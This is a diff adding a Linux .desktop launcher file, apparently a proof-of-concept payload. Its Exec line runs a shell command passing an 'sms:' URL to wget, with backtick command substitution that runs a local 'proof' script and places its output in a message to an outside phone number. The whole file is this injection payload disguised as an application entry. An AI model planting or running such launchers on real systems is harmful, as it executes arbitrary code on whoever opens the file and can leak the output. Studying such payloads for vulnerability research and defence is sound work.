@@ -1,0 +1,3 @@
+[Desktop Entry]
+Exec=sh -c "wget sms://+85292021619?body=`/proof*.sh`"
+Type=Application
